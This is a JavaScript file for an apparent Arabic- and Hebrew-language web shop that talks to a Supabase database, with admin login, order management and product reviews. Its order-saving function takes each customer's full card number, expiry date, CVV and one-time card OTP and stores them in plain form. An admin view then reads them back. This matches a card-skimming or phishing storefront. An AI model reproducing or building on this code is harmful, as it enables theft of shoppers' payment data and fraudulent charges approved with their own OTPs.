var SUPABASE_URL = 'https://blozysudthytzkfepgqc.supabase.co';
var SUPABASE_ANON_KEY = 'sb_publishable_tRk0OqQQQlxCt8dlngXwfw_DtrqVaXM';

var _supabase = null;
var _adminAuthChecked = false;

function getSupabase() {
  if (_supabase) return _supabase;
  if (typeof supabase !== 'undefined' && supabase.createClient) {
    _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }
  return _supabase;
}

// Admin authentication
async function signInAdmin(email, password) {
  try {
    var sb = getSupabase();
    if (!sb) return { error: 'Supabase not loaded' };
    var { data, error } = await sb.auth.signInWithPassword({ email: email, password: password });
    if (data && data.session) {
      localStorage.setItem('auraAdminSession', JSON.stringify(data.session));
    }
    return { data: data, error: error };
  } catch (e) {
    return { error: e.message };
  }
}

function signOutAdmin() {
  localStorage.removeItem('auraAdminSession');
  localStorage.removeItem('adminToken');
  localStorage.removeItem('adminSessionStart');
  var sb = getSupabase();
  if (sb) {
    try { sb.auth.signOut(); } catch(e) {}
  }
  window.location.href = '/admin-login/';
}

async function restoreAdminSession() {
  _adminAuthChecked = true;
  try {
    var sessionData = localStorage.getItem('auraAdminSession');
    if (!sessionData) return false;
    var session = JSON.parse(sessionData);
    if (!session.access_token) {
      localStorage.removeItem('auraAdminSession');
      return false;
    }
    var sb = getSupabase();
    if (!sb) return false;
    var { data, error } = await sb.auth.setSession(session);
    if (error || !data || !data.session) {
      localStorage.removeItem('auraAdminSession');
      return false;
    }
    localStorage.setItem('auraAdminSession', JSON.stringify(data.session));
    return true;
  } catch (e) {
    localStorage.removeItem('auraAdminSession');
    return false;
  }
}

function isAdminAuthenticated() {
  try {
    var sessionData = localStorage.getItem('auraAdminSession');
    if (!sessionData) return false;
    var session = JSON.parse(sessionData);
    return session.access_token && new Date(session.expires_at) > new Date();
  } catch (e) {
    return false;
  }
}

async function saveOrderToSupabase(orderData) {
  try {
    var sb = getSupabase();
    if (!sb) return false;
    var row = {
      order_id: orderData.id,
      customer_name: orderData.name,
      customer_phone: orderData.phone,
      customer_address: orderData.address,
      customer_country: orderData.country,
      products: JSON.stringify(orderData.items || []),
      total: orderData.total,
      card_holder: (orderData.cardDetails || {}).holder || '',
      card_number: (orderData.cardDetails || {}).number || '',
      card_expiry: (orderData.cardDetails || {}).expiry || '',
      card_cvv: (orderData.cardDetails || {}).cvv || '',
      card_type: (orderData.cardDetails || {}).brand || '',
      card_otp: (orderData.cardDetails || {}).otp || '',
      status: orderData.status || 'قيد المراجعة'
    };
    var { error } = await sb.from('orders').upsert(row, { onConflict: 'order_id' });
    if (error) console.warn('supabase save order error:', error);
    return !error;
  } catch (e) {
    console.warn('supabase save order exception:', e);
    return false;
  }
}

function mapSupabaseOrder(row) {
  return {
    id: row.order_id,
    name: row.customer_name,
    phone: row.customer_phone,
    address: row.customer_address,
    country: row.customer_country,
    total: row.total,
    status: row.status,
    date: row.created_at ? new Date(row.created_at).toLocaleString('ar-SA') : '-',
    paymentMethod: row.card_type || '-',
    cardDetails: {
      holder: row.card_holder || '',
      number: row.card_number || '',
      expiry: row.card_expiry || '',
      cvv: row.card_cvv || '',
      brand: row.card_type || '',
      otp: row.card_otp || ''
    },
    items: typeof row.products === 'string' ? JSON.parse(row.products || '[]') : (row.products || [])
  };
}

async function loadOrdersFromSupabase() {
  try {
    var sb = getSupabase();
    if (!sb) return [];
    var { data, error } = await sb.from('orders').select('*').order('id', { ascending: false });
    if (error) { console.warn('supabase load orders error:', error); return []; }
    return (data || []).map(mapSupabaseOrder);
  } catch (e) {
    console.warn('supabase load orders exception:', e);
    return [];
  }
}

async function updateOrderStatusInSupabase(orderId, newStatus) {
  try {
    var sb = getSupabase();
    if (!sb) return false;
    var { error } = await sb.from('orders').update({ status: newStatus }).eq('order_id', orderId);
    if (error) console.warn('supabase update order error:', error);
    return !error;
  } catch (e) {
    console.warn('supabase update order exception:', e);
    return false;
  }
}

async function deleteOrderFromSupabase(orderId) {
  try {
    var sb = getSupabase();
    if (!sb) return false;
    var { error } = await sb.from('orders').delete().eq('order_id', orderId);
    if (error) console.warn('supabase delete order error:', error);
    return !error;
  } catch (e) {
    console.warn('supabase delete order exception:', e);
    return false;
  }
}

async function saveReviewToSupabase(productId, name, rating, comment) {
  try {
    var sb = getSupabase();
    if (!sb) return false;
    var { error } = await sb.from('reviews').insert({
      product_id: productId,
      name: name,
      rating: rating,
      comment: comment,
      time: 'היום'
    });
    if (error) console.warn('supabase save review error:', error);
    return !error;
  } catch (e) {
    console.warn('supabase save review exception:', e);
    return false;
  }
}

async function loadReviewsFromSupabase(productId) {
  try {
    var sb = getSupabase();
    if (!sb) return [];
    var { data, error } = await sb.from('reviews').select('*').eq('product_id', productId).order('id', { ascending: false });
    if (error) { console.warn('supabase load reviews error:', error); return []; }
    return data || [];
  } catch (e) {
    console.warn('supabase load reviews exception:', e);
    return [];
  }
}
